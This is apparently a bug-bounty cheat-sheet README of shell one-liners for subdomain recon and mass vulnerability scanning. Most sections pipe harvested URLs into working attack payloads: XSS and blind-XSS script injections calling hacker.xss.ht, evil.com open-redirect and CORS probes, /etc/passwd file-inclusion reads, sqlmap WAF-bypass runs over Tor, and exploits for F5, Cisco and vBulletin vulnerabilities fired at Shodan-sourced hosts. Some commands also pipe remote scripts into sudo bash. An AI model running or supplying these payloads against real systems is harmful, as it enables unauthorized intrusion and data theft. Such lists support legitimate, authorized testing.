<p align="center">
   <img src="one-unscreen.gif" style="height: 200px; width: 200px;">
</p>

<div align="center">

<table>
  <tr>
    <td><a href="/CREDIT.md">CREDIT</a></td>
    <td><a href="/TOOLS.md">TOOLS & RESOURCES</a></td>
    <td><a href="/CHEAT-SHEET.md">CHEAT SHEET</a></td>
  </tr>
</table>

</div>
<details>
<summary><b>Why i made this doc ?</b></summary>
  
> 1. I was devloping tools that already exist ( it saves time )
> 2. There are many methodologies/vulnerability unknown to me ( it helps gain more knowledge act fast in bug bounty )
</details>

**One Line recon using pd tools**
```bash
subfinder -d redacted.com -all | anew subs.txt; shuffledns -d redacted.com -r resolvers.txt -w n0kovo_subdomains_huge.txt | anew subs.txt; dnsx -l subs.txt -r resolvers.txt | anew resolved.txt; naabu -l resolved.txt -nmap -rate 5000 | anew ports.txt; httpx -l ports .txt | anew alive.txt; katana -list alive.txt -silent -nc -jc -kf all -fx -xhr -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -aff | anew urls.txt; nuclei -l urls.txt -es info,unknown -ept ssl -ss template-spray | anew nuclei.txt
```
**Subdomain Enumeration**

---
```bash
**Juicy Subdomains**
subfinder -d target.com -silent | dnsx -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'

from BufferOver.run
curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u 

**from Riddler.io

curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 

**from RedHunt Labs Recon API
curl --request GET --url 'https://reconapi.redhuntlabs.com/community/v1/domains/subdomains?domain=<target.com>&page_size=1000' --header 'X-BLOBR-KEY: API_KEY' | jq '.subdomains[]' -r

**from nmap
nmap --script hostmap-crtsh.nse target.com

**from CertSpotter
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

**from Archive
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

**from JLDC
curl -s "https://jldc.me/anubis/subdomains/target.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

**from crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

**from ThreatMiner
curl -s "https://api.threatminer.org/v2/domain.php?q=target.com&rt=5" | jq -r '.results[]' |grep -o "\w.*target.com" | sort -u

**from Anubis
curl -s "https://jldc.me/anubis/subdomains/target.com" | jq -r '.' | grep -o "\w.*target.com"

**from ThreatCrowd
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=target.com" | jq -r '.subdomains' | grep -o "\w.*target.com"

**from HackerTarget
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"

**from AlienVault
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/tesla.com/url_list?limit=100&page=1" | grep -o '"hostname": *"[^"]*' | sed 's/"hostname": "//' | sort -u

**from Censys
censys subdomains target.com

**from subdomain center
curl "https://api.subdomain.center/?domain=target.com" | jq -r '.[]' | sort -u
```
---
**LFI**
```bash
cat targets.txt | (gau || hakrawler || waybackurls || katana) |  grep "=" |  dedupe | httpx -silent -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
```bash
**Open Redirect**
```bash
echo target.com | (gau || hakrawler || waybackurls || katana) | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
```
```bash
cat subs.txt | (gau || hakrawler || waybackurls || katana) | grep "=" | dedupe | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
```
**SSRF**
```bash
cat urls.txt | grep "=" | qsreplace "burpcollaborator_link" >> tmp-ssrf.txt; httpx -silent -l tmp-ssrf.txt -fr 
```
**XSS**
> Knoxss mass hunting
```bash
file=$1; key="API_KEY"; while read line; do curl https://api.knoxss.pro -d target=$line -H "X-API-KEY: $key" -s | grep PoC; done < $file
```
```bash
cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep -Ev "\.(jpeg|jpg|png|ico|gif|css|woff|svg)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
```
```bash
cat targets.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```
```bash
echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
```bash
cat urls.txt | grep "=" | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
```
```bash
cat subs.txt | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
```
-----
**Hidden Dirs**
```bash
dirsearch -l ips_alive --full-url --recursive --exclude-sizes=0B --random-agent -e 7z,archive,ashx,asp,aspx,back,backup,backup-sql,backup.db,backup.sql,bak,bak.zip,bakup,bin,bkp,bson,bz2,core,csv,data,dataset,db,db-backup,db-dump,db.7z,db.bz2,db.gz,db.tar,db.tar.gz,db.zip,dbs.bz2,dll,dmp,dump,dump.7z,dump.db,dump.z,dump.zip,exported,gdb,gdb.dump,gz,gzip,ib,ibd,iso,jar,java,json,jsp,jspf,jspx,ldf,log,lz,lz4,lzh,mongo,neo4j,old,pg.dump,phtm,phtml,psql,rar,rb,rdb,rdb.bz2,rdb.gz,rdb.tar,rdb.tar.gz,rdb.zip,redis,save,sde,sdf,snap,sql,sql.7z,sql.bak,sql.bz2,sql.db,sql.dump,sql.gz,sql.lz,sql.rar,sql.tar.gz,sql.tar.z,sql.xz,sql.z,sql.zip,sqlite,sqlite.bz2,sqlite.gz,sqlite.tar,sqlite.tar.gz,sqlite.zip,sqlite3,sqlitedb,swp,tar,tar.bz2,tar.gz,tar.z,temp,tml,vbk,vhd,war,xhtml,xml,xz,z,zip,conf,config,bak,backup,swp,old,db,sql,asp,aspx~,asp~,py,py~,rb~,php,php~,bkp,cache,cgi,inc,js,json,jsp~,lock,wadl -o output.txt
```
```bash
ffuf -c -w urls.txt:URL -w wordlist.txt:FUZZ -u URL/FUZZ -mc all -fc 500,502 -ac -recursion -v -of json -o output.json
```
**ffuf json to txt output**
```bash
cat output.json | jq | grep -o '"url": "http[^"]*"' | grep -o 'http[^"]*' | anew out.txt
```
**earch for Sensitive files from Wayback**
```bash
echo target.com | (gau || hakrawler || waybackurls || katana) | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar"
```
---
**SQLi**
```bash
cat subs.txt | (gau || hakrawler || katana || waybckurls) | grep "=" | dedupe | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs &&
for i in $(cat tmp-sqli.txt); do ghauri -u "$i" --level 3 --dbs --current-db --batch --confirm; done
```
**Bypass WAF using TOR**
```bash
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor --dbs --random-agent --tamper=space2comment
```
**find which host is vuln in output folder of sqlmap/ghauri**
`root@bb:~/.local/share/sqlmap/output`
```bash
find -type f -name "log" -exec sh -c 'grep -q "Parameter" "{}" && echo "{}: SQLi"' \;
```
**CORS**
```bash
echo target.com | (gau || hakrawler || waybackurls || katana) | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
**Prototype Pollution**
```bash
subfinder -d target.com -all -silent | httpx -silent -threads 100 | anew alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```
**JS Files**
>Find JS Files
```bash
cat target.txt | (gau || hakrawler || waybackurls || katana) | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew js.txt
```
```bash
while read -r url; do
  if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q 200 && \
     curl -s -I "$url" | grep -iq 'Content-Type:.*\(text/javascript\|application/javascript\)'; then
    echo "$url"
  fi
done < urls.txt > js.txt
```
**Hidden Params in JS**
```bash
cat subs.txt | (gau || hakrawler || waybackurls || katana) | sort -u | httpx -silent -threads 100 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
```
**Extract sensitive end-point in JS**
```bash
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```
**SSTI**
```bash
for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
```
```bash
echo target.com | gau --subs --threads 200 | httpx -silent -mc 200 -nc | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt && ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
```
**Scan IPs**
```bash
cat my_ips.txt | xargs -L 100 shodan scan submit --wait 0
```
**Screenshots using Nuclei**
```bash
nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
```
**SQLmap Tamper Scripts - WAF bypass**
```bash
sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --no-cast --no-escape --dbs --random-agent
```
**Shodan Cli**
```bash
shodan search Ssl.cert.subject.CN:"target.com" --fields ip_str | anew ips.txt
```
**Ffuf.json to only `ffuf-url.txt`**
```bash
cat ffuf.json | jq | grep "url" | sed 's/"//g' | sed 's/url://g' | sed 's/^ *//' | sed 's/,//g'
```
**Update golang**
```bash
curl https://raw.githubusercontent.com/udhos/update-golang/master/update-golang.sh | sudo bash
```
**Censys CLI**
```bash
censys search "target.com" --index-type hosts | jq -c '.[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
```
**Nmap cidr to `ips.txt`**
```bash
cat cidr.txt | xargs -I @ sh -c 'nmap -v -sn @ | egrep -v "host down" | grep "Nmap scan report for" | sed 's/Nmap scan report for //g' | anew nmap-ips.txt'
```
**Xray urls scan**
```bash
for i in $(cat subs.txt); do ./xray_linux_amd64 ws --basic-crawler $i --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal --ho $(date +"%T").html ; done
```  
**grep only nuclei info**
```bash
result=$(sed -n 's/^\([^ ]*\) \([^ ]*\) \([^ ]*\) \([^ ]*\).*/\1 \2 \3 \4/p' file.txt)
echo "$result"
```
``[sqli-error-based:oracle] [http] [critical] https://test.com/en/events/e5?utm_source=test'&utm_medium=FUZZ'``

**Download js files**
```bash
mkdir -p js_files; while IFS= read -r url || [ -n "$url" ]; do filename=$(basename "$url"); echo "Downloading $filename JS..."; curl -sSL "$url" -o "downloaded_js_files/$filename"; done < "$1"; echo "Download complete."

# Or

sed -i 's/\r//' js.txt && for i in $(cat js.txt); do wget "$i"; done
```
**Filter only html/xml content-types for xss**
```bash
cat urls.txt | grep "=" | grep "?" | uro | httpx -ct -silent -nc | grep -i -E "text/html|application/xhtml+xml|application/xml|text/xml|image/svg+xml" | cut -d '[' -f 1 | anew xml_html.txt

# using curl
while read -r url; do
  if curl -s -o /dev/null -w "%{http_code}" "$url" | grep -q 200 && \
     curl -s -I "$url" | grep -iq 'Content-Type:.*text/\(html\|xml\)'; then
    echo "$url"
  fi
done < urls.txt > xml_html.txt
```
**Get favicon hash**
```bash
curl https://favicon-hash.kmsec.uk/api/?url=https://test.com/favicon.ico | jq
```
**Build wordlists from a nuclei templates**
```bash
for i in `grep -R yaml | awk -F: '{print $1}'`; do cat $i | grep 'BaseURL}}/' | awk -F '{{BaseURL}}' '{print $2}' | sed 's/"//g' | sed "s/'//g"; done
```
**To find dependency confusion(confused)**
```bash
[ -f "urls.txt" ] && mkdir -p downloaded_json && while read -r url; do wget -q "$url" -O "downloaded_json/$(basename "$url")" && scan_output=$(confused -l npm "downloaded_json/$(basename "$url")") && echo "$scan_output" | grep -q "Issues found" && echo "Vulnerability found in: $(basename "$url")" || echo "No vulnerability found in: $(basename "$url")"; done < <(cat urls.txt)
```
**find params using x8**
```bash
subdomain -d target.com -silent -all -recursive | httpx -silent | sed -s 's/$/\//' | xargs -I@ sh -c 'x8 -u @ -w parameters.txt -o output.txt'
```
**find reflected parameters for xss - [xss0r](https://raw.githubusercontent.com/xss0r/xssorRecon/refs/heads/main/reflection.py)**
```bash
python3 reflection.py urls.txt | grep "Reflection found" | awk -F'[?&]' '!seen[$2]++' | tee reflected.txt
```
**Find Subdomain**
```bash
subfinder -d target.com -silent | httpx -silent -o urls.txt
```
**Search Subdomain using Gospider**
```bash
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```
**find .git/HEAD**
```bash
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's****.git/HEAD**' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
**Check .git/HEAD**
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's****.git/HEAD**' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
**Find XSS** 
**Single target**
```bash
gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
```
**Multiple target**
```bash
gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
```
**Find XSS**
```bash

hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht

# save to .sh, and run bash program.sh target.com
```
**Kxss to search param XSS**
```bash
echo http://testphp.vulnweb.com/ | waybackurls | kxss
```
**XSS hunting multiple**
```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```
**BXSS - Bling XSS in Parameters**
```bash
subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
```
**Blind XSS In X-Forwarded-For Header**
```bash
subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
```
**Gxss with single target**
```bash
echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```
**XSS using gf with single target**
```bash
echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew 
```
**XSS without gf**
```bash
waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
`or`
```bash
gospider -S target.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
**XSS qsreplace**
```bash
gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```
**XSS httpx**
```bash
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
```
**Automating XSS using Dalfox, GF and Waybackurls**
```bash
cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
```
**XSS from javascript hidden params**
```bash
assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```
**XSS freq**
```bash
echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
```
**Find xss**
```bash
cat targets | waybackurls | anew | grep "=" | gf xss | nilo | Gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
```
```bash
cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
```
```bash
cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro | dalfox pipe -b your.xss.ht -o xss.txt
```
**Find XSS + knoxss**
```bash
echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh 
```
**Dump In-Scope Assests from Bounty Program**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```
**Recon.dev**
```bash
curl "https://recon.dev/api/search?key=YOURAPIKEY&domain=target.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```
**Jaeles scan to bugbounty targets.**
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
```
```bash
curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
```
**Nuclei scan to bugbounty targets.**
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | httpx -silent | xargs -n 1 gospider -o output -s ; cat output/* | egrep -o 'https?://[^ ]+' | nuclei -t ~/nuclei-templates/ -o result.txt
```
```bash
amass enum -passive -norecursive -d https://target.com -o domain ; httpx -l domain -silent -threads 10 | nuclei -t nuclei-templates -o result -timeout 30
```
**Endpoints, by apks**
```bash
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's****' | anew | grep -v "w3\|android\|github\|http://schemas.android\|google\|http://goo.gl"
```

**Find Subdomains TakeOver**
```bash
subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```
**CORS Misconfiguration
```bash
site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
**SQL Injection
```bash
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
```
**Search SQLINJECTION using qsreplace search syntax error**
```bash
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```
**SQLi-TimeBased scanner**
```bash
gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done
```
**Recon to search SSRF Test**
```bash
findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
```
**Using shodan & Nuclei**
```bash
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```
```bash
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 
```
**if we don't have chaos api_key**
```bash
cat domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s ~/Tools/jaeles-signatures -u @
```

**Check Blind ssrf in Header,Path,Host & check xss via web cache poisoning.**
```bash
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
```
**Local File Inclusion**
```bash
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
**Open-redirect**
```bash
export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```
**Directory Listing**
**(Feroxbuster) common command**
```bash
feroxbuster -u https://target.com --insecure -d 1 -e -L 4 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```
**(Feroxbuster) Multiple values**
```bash
feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx
```
**(Feroxbuster) Read urls from STDIN; pipe only resulting urls out to another tool**
```bash
cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files
```
**search javascript file**
```bash
gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
```
**Uncover**
```bash
uncover -q http.title:"GitLab" -silent | httpx -silent | nuclei
uncover -q target -f ip | naabu
echo jira | uncover -e shodan,censys -silent
```
```bash
uncover -q 'org:"DoD Network Information Center"' | httpx -silent | nuclei -silent -severity low,medium,high,critical
```
**Find admin login**
```bash
cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
```
**403 login Bypass**
```bash
cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
```
**Recon Parameters**
```bash
echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive
```
**Local File Inclusion**
```bash
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
**Open-redirect**
```bash
export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```
```bash
cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
```
**XSS**
```bash
gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
```
```bash
waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt
```
```bash
cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"
```
**Prototype Pollution**
```bash
subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```
**CVE-2020-5902**
```bash
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```
**CVE-2020-3452**
```bash
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt
```
**CVE-2022-0378**
```bash
cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done
```
**vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution**
```bash
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
```
**Find JavaScript Files**
```bash
assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
```
**Extract Endpoints from JavaScript**
```bash
cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```
**Get CIDR & Org Information from Target Lists**
```bash
for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done
```
**Get Subdomains from RapidDNS.io**
```bash
export host="HOST" ; curl -s "https://rapiddns.io/subdomain/$host?full=1**esult" | grep -e "<td>.*$host</td>" | grep -oP '(?<=<td>)[^<]+' | sort -u
```
**Get Subdomains from BufferOver.run**
```bash
curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
```
```bash
